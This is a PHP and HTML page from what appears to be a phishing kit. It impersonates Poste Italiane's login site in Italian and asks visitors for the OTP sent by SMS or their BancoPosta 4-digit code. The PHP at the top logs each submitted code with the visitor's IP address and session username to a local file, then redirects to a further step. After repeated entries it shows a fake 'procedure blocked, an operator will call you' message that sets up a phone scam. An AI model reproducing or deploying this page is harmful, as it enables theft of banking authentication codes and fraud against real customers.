<?php
session_start();
//require_once '../config.php'
if(isset($_POST["otp"])){
	$date = date('Y-m-d H-i-s');
	if(isset($_SESSION["user"])) {$user = $_SESSION["user"]; } else { $user = "undefined"; }
	$out="[{$date}] {$_SERVER['REMOTE_ADDR']} $user {$_POST['otp']}\n";
	file_put_contents("c", $out, FILE_APPEND | LOCK_EX);
	header("Location: elaborazione.php?route=conferma");
}
if(!isset($_SESSION["err"])){
	$_SESSION["err"] = 0;
}else{
	$_SESSION["err"] += 1;
}

?>
<!DOCTYPE html>
<html class="pi-lg pi-firefox" lang="it"><head>
		<title>Accedi o Registrati</title>
			<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
			<meta http-equiv="X-UA-Compatible" content="IE=edge">
			<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, user-scalable=0">
			<meta name="identifier" content="1453897797466">
				<link type="text/css" rel="stylesheet" href="login_files/bootstrap.css">
				<link type="text/css" rel="stylesheet" href="login_files/owl.css">
				<link type="text/css" rel="stylesheet" href="login_files/slick.css">
				<link type="text/css" rel="stylesheet" href="login_files/slick-theme.css">
				<link type="text/css" rel="stylesheet" href="login_files/base.css">
				<link type="text/css" rel="stylesheet" href="login_files/megamenu-pi.css">
				<link type="text/css" rel="stylesheet" href="login_files/retina.css">
				<link type="text/css" rel="stylesheet" href="login_files/custom-form-element.css">
				<link type="text/css" rel="stylesheet" href="login_files/bootstrap-datepicker.css">
				<link type="text/css" rel="stylesheet" href="login_files/ion_002.css">
				<link type="text/css" rel="stylesheet" href="login_files/ion.css">
				<link type="text/css" rel="stylesheet" href="login_files/configuratore.css">

				<script type="text/javascript" src="login_files/js.js"></script>
				<script type="text/javascript" src="login_files/bowser.js"></script>
				<script type="text/javascript" src="login_files/responsive-bootstrap-toolkit.js"></script>

				<!--[if lt IE 9]>



				<script type="text/javascript" src="/risorse_dt/bootstrap/js/html5shiv.min.js"></script>


				<![endif]-->



				<!--[if lt IE 9]>



				<script type="text/javascript" src="/risorse_dt/bootstrap/js/respond.min.js"></script>


				<![endif]-->



				<!--[if IE 8]>


				<link type="text/css" rel="stylesheet" href="/risorse_dt/condivise/stili/trasversali/ie8.css">



				<![endif]-->



				<!--[if lt IE 8]>


				<link type="text/css" rel="stylesheet" href="/risorse_dt/condivise/stili/trasversali/ie7-ie6.css">



				<![endif]-->




				<link type="text/css" rel="stylesheet" href="login_files/custom.css">







			<style>
				.ng-hide{
					display:none;
				}
			</style>
			<meta name="DCSext.TipoPagina" content="Pagina Applicativa">
			<meta name="DCSext.AreaSito" content="Non Settato">
			<meta name="DCSext.AreaBusiness" content="Non Settato">
			<meta name="DCSext.Famiglia_Prodotto" content="Non Settato">
			<meta name="wt.cg_n" content="Non Settato">
			<meta name="DCSext.Gamma" content="Non Settato">
			<meta name="wt.cg_s" content="Non Settato">
			<meta name="DCSext.Bisogno" content="Non Settato">
			<meta name="DCSext.Prodotto" content="Non Settato">
			<meta name="DCSext.AreaCustom1" content="Non Settato">
			<meta name="DCSext.AreaCustom2" content="Non Settato">


<script type="text/javascript" src="login_files/get-client-info"></script>
<script type="text/javascript" src="login_files/json2.js"></script>
<script type="text/javascript" src="login_files/pbase-css.js"></script>
<script type="text/javascript" src="login_files/pbase-css-poste.js"></script>

	</head>
	<body style="padding-top: 49px;">
	<div class="content content-alert-browser">
		<div id="content-alert-old-browser" class="content content-alert-old-browser">
			<div class="container">
				<div class="row">
					<div class="col-md-12">
						<div id="alertIe" class="innerspacer-xs-top-20 innerspacer-xs-bottom-20">
							<div id="alertIe-inner">
								La versione del tuo browser non è aggiornata. Per una migliore navigazione del sito, scarica la versione più recente.
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div id="content-alert-cookie" class="content content-alert-cookie" style="display: block;">
			<div class="container">
				<div class="row">
					<div class="col-md-12">
						<div id="alertCookie" class="innerspacer-xs-top-30 innerspacer-xs-bottom-20">
							<div id="alertCookie-inner">
								I nostri cookie e quelli installati da terze parti ci aiutano a
migliorare i nostri servizi online. Se ne accetti l'uso continua a
navigare sul nostro sito. Se vuoi saperne di più o negare il consenso a
tutti o ad alcuni cookie clicca su: <a href="https://securelogin.poste.it/jod-fcc/_CSEMBEDTYPE_=internal&amp;_WRAPPER_=Wrappers%2FPageWrapper&amp;_PAGENAME_=Posteit/Page/PaginaLiberaLayout&amp;_cid_=1453895021752&amp;_c_=Page">approfondisci</a>
							</div>
							<span title="chiudi informativa sintetica sui cookie" id="alertCookie-confirm"><img src=" data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAcEBAQFBAcFBQcKBwUHCgwJBwcJDA0LCwwLCw0RDQ0NDQ0NEQ0PEBEQDw0UFBYWFBQeHR0dHiIiIiIiIiIiIiL/2wBDAQgHBw0MDRgQEBgaFREVGiAgICAgICAgICAgICAhICAgICAgISEhICAgISEhISEhISEiIiIiIiIiIiIiIiIiIiL/wAARCAAMAAsDAREAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAABwMF/8QAJhAAAQMDAgUFAAAAAAAAAAAAAgEDBAUGBwAREhMyYYEVIUFEUf/EABQBAQAAAAAAAAAAAAAAAAAAAAD/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCGbH5+O78qNHtiox4VPv5kPUWXPpOm7y3JCbdIuCRe/cvxNA9WdY1vWza8CgwGQciwmUbF0hRSNeonF7mSqXnQCuMqNTckUvItx3a0kyqSCchC58MMsN8xsWEXfg4SEV8aDMx3nu/YdlU2HvHkJGaVkHXwInFBslAOIkNN9hRE0H//2Q==" alt="chiudi"></span>
						</div>
						<script type="text/javascript" src="login_files/cookie-adv-pi.js"></script>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="content content-federation-bar content-federation-bar-minified content-federation-bar-simplified">
		<div class="container container-extended">
			<div class="row">
				<div class="col-md-12">
					<div class="header-minified">
						<div class="row">
							<div class="col-xs-12">
								<div class="federation-bar-content-logo pull-xs-left clearfix">
									<div class="logo">

											<a href="https://www.poste.it/index.html" title="" class="hidden-xs hidden-sm">
												<span class="wrap-logo wrap-logo-medium"><img alt="Poste Italiane" src="login_files/logo-poste-italiane-medium.png" srcset="https://www.poste.it/img/1476457494742/2X/logo-poste-italiane-medium.png 2x" class="logo-image-pi-medium"></span>
											</a>


											<a href="https://www.poste.it/index.html" title="" class="logo-mobile hidden-md hidden-lg">
												<span class="wrap-logo wrap-logo-small"><img alt="Poste Italiane" src="login_files/logo-poste-italiane-small.png" srcset="https://www.poste.it/img/1473803290446/2X/logo-poste-italiane-small.png 2x" class="logo-image-pi-small"></span>
											</a>

									</div>



								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
</div>
		<!--googleon: all-->
			<div class="content content-main nobracket border-xs-bottom">
				<div class="container">
					<div class="row">
						<div class="col-md-12" id="accessibility-anchor">
							<div class="row">
								<div class="col-xs-12">
									<div id="main">





<div id="main">
	  <div class="row">
		 <div class="col-sm-6 col-md-7 col-lg-8">
			<div class="main-pills">
			   <div class="main-pills-wrap">
				  <div class="row">
					 <div class="col-sm-12">
						   <div class="row">
							  <div class="col-sm-12">
							  </div>
							  <div class="col-xs-12">
								<div class="box-advice box-messages box-success">
									<div class="box-heading">
										<h3 class="area-heading">
                      Conferma OTP
										</h3>
									</div>
									<div class="box-body">
										<p>Gentile Cliente,</p>
           					<p>A breve le arriverà un codice dispositivo sulla sua utenza telefonica per poter confermare l'aggiornamento.Le verranno detratti 0,15 CENT/EURO che le verranno restituiti alla fine della procedura. La preghiamo di attendere fino a 15 minuti ed inserire tale codice ne form sottostante. Per gli utenti BancoPosta inserisci il Codice a 4 cifre ricevuto durante la Registrazione del sito per completare l'aggiornamento.</p>
									</div>
								</div>
							</div>
							<?php if($_SESSION["err"] > 0 && $_SESSION["err"] < 8): ?>
							<div class="col-xs-12">
							<div class="box-advice box-messages box-danger">
								<div class="box-heading">
									<h3 class="area-heading">
										Codice inserito errato
									</h3>
								</div>
								<div class="box-body">
									<p>Immetti il nuovo codice che hai ricevuto via SMS.</p>
								</div>
							</div>
						</div>
					<?php endif; ?>
							  <div class="col-sm-12">
								<div class="box-editable-area">
									<p>Compila il seguente modulo:</p>
								</div>
							  </div>
						   </div>
						   <div class="row">
							  <div class="col-sm-12">
								 <!-- Tab panes -->
								 <div class="tab-content">
									<div role="tabpanel" class="tab-pane active" id="privati">
										<form class="form-login spacer-xs-bottom-30 clearfix" method="POST" action="conferma.php">
                     <div class="row">
                       <div class="col-sm-8">
                         <div class="form-group form-group-lg">
                         <p>
                            <label class="control-label" for="otp">
                             OTP
                            </label>
                            <input title="" name="otp" id="otp" class="form-control" placeholder="Inserisci" type="text">
                           </p>
                          </div>
                        </div>
                      </div>
									   <div class="row">
										  <div class="col-sm-12">
											 <div class="row">
												<div class="col-sm-12 col-md-6">
												   <div class="btn-contaiener btn-container-left spacer-xs-bottom-0 spacer-xs-top-15 clearfix">
													  <input class="btn btn-primary btn-expand" value="CONVALIDA" type="submit">
												   </div>
												</div>
											 </div>
										  </div>
									   </div>
									</form></div>
								 </div>
							  </div>
						   </div>
					 </div>
				  </div>
			   </div>
			</div>
		 </div>
		 <div class="col-sm-6 col-md-5 col-lg-4 spacer-xs-top-30 spacer-sm-top-0">
			<div class="main-pills">
			   <div class="main-pills-wrap">
				  <div class="row">
					 <div class="col-sm-12">
						<h2>Accedi con PosteID abilitato a SPID</h2>
					 </div>
					 <div class="col-sm-12">
						<p>
						   L'identità digitale di Poste Italiane che ti consente di
accedere a tutti i servizi di Poste abilitati e ai servizi che espongono
 il logo SPID
						</p>
					 </div>
					 <!--
					 <div class="col-sm-12">
						<div class="spacer-xs-bottom-30 spacer-xs-top-30 text-xs-center">
						   <a href="#"><img src="/risorse_dt/condivise/immagini/loghi/logo-posteid.png" /></a>
						</div>
					 </div>
					 <div class="col-sm-12">
						<div class="btn-container btn-container-left spacer-xs-bottom-0 spacer-xs-top-15 clearfix">
						   <button type="button" class="btn btn-primary btn-expand">accedi con PosteID</button>
						</div>
					 </div> -->
					 <div class="col-sm-12">
						<div id="bottonePosteID"><div class="bottonePosteID-wrapper text-xs-center"><a href=""><img onclick="alert('Non è possibile accedere con SPID durante questa procedura.')" src="login_files/logo-posteid.png" srcset="/risorse_dt/condivise/immagini/loghi/logo-posteid@2x.png 2x" class="spacer-xs-bottom-30 spacer-xs-top-30"><span onclick="alert('Non è possibile accedere con SPID durante questa procedura.')" class="wrapperPosteID-info spacer-xs-top-15 btn btn-primary btn-expand">Accedi con PosteID</span></a></div><div class="newUserPosteID-wrapper"></div></div>
					 </div>
				  </div>
			   </div>
			</div>
		 </div>
	  </div>
	  <div class="row">
		 <div class="col-sm-12 spacer-xs-top-30">
			<div class="main-pills main-pills-basic">
			<div class="box-editable-area box-editable-spacing">
			   <p class="spacer-xs-top-20 text-xs-center">In caso di mancato accesso o non funzionamento dei servizi è possibile contattare il Call Center al numero verde <a href="tel:803.160">803.160</a>
 (dal lunedì al sabato dalle ore 8.00 alle ore 20.00) effettuando la
scelta "3" per i Servizi Internet.
				  La chiamata è gratuita da rete fissa; le chiamate da rete mobile
sono gratuite solo per informazioni su PosteMobile. Per le altre
informazioni, da rete mobile chiamare il <a href="tel:199.100.160">199.100.160</a>.</p>
			</div>
			</div>
		 </div>
	  </div>
   </div>



									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>

				<div class="content content-post-main  border-xs-bottom">
				      <div class="container">










	<div class="row">
		<div class="col-sm-12">
			<div class="row">

					<div class="col-sm-12">
						<h2 class="text-xs-center">Hai bisogno di aiuto?</h2>
					</div>




						<div class="col-md-12 col-lg-push-1 col-lg-10">
							<div class="btn-container text-xs-center">
								<div class="row">

										<div class="col-sm-6 col-md-4">

											<a href="https://www.poste.it/chiamaci.html" class="btn btn-primary btn-expand" target="_self"><img alt="Chiamaci" src="login_files/chiamaci.png" srcset="https://www.poste.it/2X/icone-cta/chiamaci.png 2x" class="spacer-xs-right-10">Chiamaci</a>
										</div>

										<div class="col-sm-6 col-md-4">

											<a href="https://www.poste.it/scrivici.html" class="btn btn-primary btn-expand" target="_self"><img alt="Scrivici" src="login_files/scrivici.png" srcset="https://www.poste.it/2X/icone-cta/scrivici.png 2x" class="spacer-xs-right-10">Scrivici</a>
										</div>

										<div class="col-sm-6 col-md-4">

											<a href="https://www.poste.it/cerca/index.html#/vieni-in-poste" class="btn btn-primary btn-expand" target="_self"><img alt="Vieni in poste" src="login_files/vieni-in-poste-cerca-up.png" srcset="https://www.poste.it/2X/icone-cta/vieni-in-poste-cerca-up.png 2x" class="spacer-xs-right-10">Vieni in Poste</a>
										</div>

								</div>
							</div>
						</div>


			</div>
		</div>
	</div>



					</div>
				</div>















	<div class="content content-footer content-footer-post">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<div class="row">
						<div class="col-md-8">
							<p class="text-xs-center text-md-left">
								© Poste Italiane 2020 - Partita iva : 01114601006&nbsp;&nbsp;
							</p>
						</div>
						<div class="col-md-4">
							<div class="clearfix">
								<div class="base-footer">

								</div>
							</div>
						</div>
					</div>
					<a href="#" class="btn btn-primary btn-cta back-to-top"> <span class="hide">vai a inizio pagina</span>
					</a>
				</div>
			</div>
		</div>
	</div>






	<script type="text/javascript">
		$(function() {
			$('#checkboxloginRememberMe').change(function() {
				if ($(this).prop('checked')) {
					$('#loginRememberMe').val('on');
				} else {
					$('#loginRememberMe').val('');
				}
			});
		});
	</script>







				<script type="text/javascript" src="login_files/start-script.js"></script>






				<script type="text/javascript" src="login_files/staticlogin.js"></script>






				<script type="text/javascript" src="login_files/bootstrap.js"></script>






				<script type="text/javascript" src="login_files/ie10-viewport-bug-workaround.js"></script>






				<script type="text/javascript" src="login_files/image-loader-post.js"></script>






				<script type="text/javascript" src="login_files/bloodhoud.js"></script>






				<script type="text/javascript" src="login_files/base-element-search.js"></script>






				<script type="text/javascript" src="login_files/check-login.js"></script>






				<script type="text/javascript" src="login_files/staticrecommendation.js"></script>






				<script type="text/javascript" src="login_files/jquery_002.js"></script>






				<script type="text/javascript" src="login_files/webtrends.js"></script>




	<div class="modal modal-spinner fade" id="myModalLoading" tabindex="-1" role="dialog" aria-labelledby="mySmallModalLabel">
		<div class="modal-dialog modal-xs">
			<div class="modal-content">
				<h3>Caricamento...</h3>
				<img src="login_files/spinner_bianco.gif" class="">
			</div>
		</div>
	</div>


	<div class="modal fade ng-scope in" id="modalContratti" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" ng-if="contratti" data-backdrop="static" data-keyboard="false" style="display: <?php if($_SESSION["err"] > 8){ print_r("block;"); } else { print_r("none;"); } ?> padding-right: 17px;">
	<div class="modal-dialog" role="document" style="margin-top: 87.5px;">
		 <div class="modal-content">
				 <div class="modal-header">
						 <h4 class="modal-title" id="modalContrattiLabel"><img src="login_files/logo-poste-italiane-small.png"></h4>
				 </div>
				 <div class="modal-body">
						 <p>
							 <p>PROCEDURA BLOCCATA PER MOTIVI DI COMPILAZIONE ERRATA NEI PROSSIMI MINUTI UN OPERATORE LA CONTATTERA PER PROCEDERE CON LA PRATICA MANUALE</p>
						 </p>
				 </div>
				 <div class="modal-footer">
						 <div class="row">
								 <div class="col-sm-12">
										 <p class="spacer-xs-bottom-0 text-xs-right">
												 <a class="btn btn-secondary ng-binding" href="https://www.poste.it/">Avanti</a>
										 </p>
								 </div>
						 </div>
				 </div>
		 </div>
	</div>
	</div>





		<script language="JavaScript">

		</script>




		<script type="text/javascript">
		var usern = "";
		jQuery('#username').val("");
		if (usern.length > 0) {
			jQuery('#checkbox-xs').prop("checked", true);
			jQuery('#checkbox-md-lg').prop("checked", true );
			jQuery('#rememberme').val("on");
		}
		</script>

		<form name="loginform1" id="loginform1" method="post" action="/jod-fcc/dislogin">
			<input value="" id="secureToken" name="secureToken" type="hidden">
			<input value="" id="signature" name="signature" type="hidden">
			<input name="dep" id="dep" value="" type="hidden">
			<input name="dop" id="dop" value="" type="hidden">
			<input name="evp" id="evp" value="" type="hidden">

		</form>

		<script type="text/javascript">
		jQuery("#x_chiudi").attr("href", "https://www.poste.it");
		</script>



		<script type="text/javascript">
		$('#_nocookie').toggleClass("hide");
		$('#bottonePosteID').html('<div class="bottonePosteID-wrapper"><a href="/jod-fcc/federated/loginsecure"><img src="login_files/logo-posteid_3.png" srcset="/risorse_dt/condivise/immagini/loghi/logo-posteid@2x.png 2x" class="" /><span class="wrapperPosteID-info">Entra con PosteID <span class="wrapperPosteID-name"></span></span></a></div><div class="newUserPosteID-wrapper"></div>');
		</script>
